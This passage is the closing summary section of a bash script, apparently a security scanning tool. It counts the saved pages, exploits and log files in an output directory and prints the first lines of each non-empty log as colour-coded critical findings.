echo -e "${CYAN}Pages: $(ls -1 "$OUTPUT_DIR/pages/" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Exploits: $(ls -1 "$OUTPUT_DIR/exploits/" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Logs: $(ls -1 "$OUTPUT_DIR/logs/" 2>/dev/null | wc -l)${NC}"
echo ""
echo -e "${YELLOW}CRITICAL FINDINGS:${NC}"
for logfile in "$OUTPUT_DIR/logs"/*.txt; do
    if [ -f "$logfile" ] && [ -s "$logfile" ]; then
        echo -e "${RED}[!] $(basename "$logfile" .txt)${NC}"
        cat "$logfile" | head -3
        echo ""
    fi
done
echo ""
echo -e "${RED}=====================================${NC}"
echo -e "${GREEN}All results saved to: $OUTPUT_DIR/${NC}"
echo -e "${RED}=====================================${NC}"
